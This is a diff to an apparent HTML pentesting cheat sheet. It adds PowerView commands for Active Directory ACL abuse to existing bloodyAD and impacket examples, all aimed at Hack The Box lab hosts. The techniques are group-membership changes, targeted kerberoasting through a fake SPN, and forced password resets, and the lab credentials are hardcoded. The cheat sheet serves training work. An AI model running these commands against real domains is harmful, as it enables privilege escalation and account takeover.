@@ -112,6 +112,21 @@ set LPORT 9999</code></pre>
                         <ul>
                             <p>In case you found that you cant spawn a shell using evilwinrm or psexec you can make use of Bloody AD to perform changes inside the domain. In that case having in mind that we have "GenericAll" permision over a group we can add a user to that group</p>
                             <pre><code class="language-bash">bloodyAD -u 'p.agila@fluffy.htb' -p 'prometheusx-303' add groupMember 'SERVICE ACCOUNTS' p.agila</code></pre>
+                            <h4>PowerView</h4>
+                            <ul>
+                                <p>Take password of the user you control and create a variable that we will use later</p>
+                                <pre><code class="language-powershell">$SecPassword = ConvertTo-SecureString 'mypassword@1' -AsPlainText -Force</code></pre>
+                                <p>Take username you control and add the password creating a new variable</p>
+                                <pre><code class="language-powershell">$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)</code></pre>
+                                <p>Perform the group change</p>
+                                <pre><code class="language-powershell">Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose</code></pre>
+                            </ul>
+                            
+                            <p>Get info about the group</p>
+                            <pre><code class="language-powershell">Get-DomainGroup "HELP DESK LEVEL 1"</code></pre>
+                            <p>Check group members</p>
+                            <pre><code class="language-powershell">net group "Help Desk Level 1" /domain</code></pre>
+                             
                         </ul>
                         <h3>Targeted kerberoasting</h3>
                         <ul>
@@ -119,7 +134,17 @@ set LPORT 9999</code></pre>
                             <p>Here you asign a SPN to the alfred account. This makes the account vulnerable since we can request ticket with impacket tool</p>
                             <pre><code class="language-bash">bloodyAD -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb --host 10.10.11.72 set object alfred servicePrincipalName -v 'http/fake.tombwatcher.htb'</code></pre>
                             <p>Then request the ticket with impacket tool, copy the ticket and crack it using hashcat</p>
-                            <pre><code class="language-bash">impacket-GetUserSPNs tombwatcher.htb/henry:'H3nry_987TGV!' -dc-ip 10.10.11.72 -request</code></pre>        
+                            <pre><code class="language-bash">impacket-GetUserSPNs tombwatcher.htb/henry:'H3nry_987TGV!' -dc-ip 10.10.11.72 -request</code></pre>
+                            
+                            <h4>PowerView</h4>
+                            <ul>
+                                <p>Store password of the user you control in variables</p>
+                                <pre><code class="language-bash">$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)</code></pre>
+                                <p>Setup a fake SPN for the user you would like to perform the targeted kerberoasting ataack</p>
+                                <pre><code class="language-bash">Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose</code></pre>
+                                <p>Finally export the ticket using rubeuss...</p> 
+                            </ul>
                         </ul>  
                         <h3>Dump GSMA password</h3>
                         <ul>
@@ -135,7 +160,19 @@ set LPORT 9999</code></pre>
                             <p>In case you found that you have the right <b>ForceChangePassword</b> over a user you can change the password of it </p>
                             <p></p>
                             <pre><code class="language-bash">bloodyAD --host dc01.tombwatcher.htb --dc-ip 10.10.11.72 -d tombwatcher.htb -u "ansible_dev$" -p p@ssword set password SAM "mypassword"</code></pre>
-                            <p></p>
+                            <h4>PowerView</h4>
+                            <ul>
+                                <p>Same process but from PowerView.ps1</p>
+                                <p>Create a variable for the password of the username you control</p>
+                                <pre><code class="language-powershell">$SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force</code></pre>
+                                <p>Create a variable for the username you cotrol using the previous variable</p>
+                                <pre><code class="language-powershell">$Cred = New-Object System.Management.Automation.PSCredential('inlanefreight\wley', $SecPassword)</code></pre>
+                                <p>Create a variable for the new password you would like to setup for the targeted username</p>
+                                <pre><code class="language-powershell">$UserPassword = ConvertTo-SecureString 'mypassword' -AsPlainText -Force</code></pre>
+                                <p>Finally perform the force change password attack</p>
+                                <pre><code class="language-powershell">Set-DomainUserPassword -Identity DAMUNDSEN -AccountPassword $UserPassword -Credential $Cred</code></pre>
+
+                            </ul>
                         </ul> 
 
                         <h3>Change Ownership</h3>
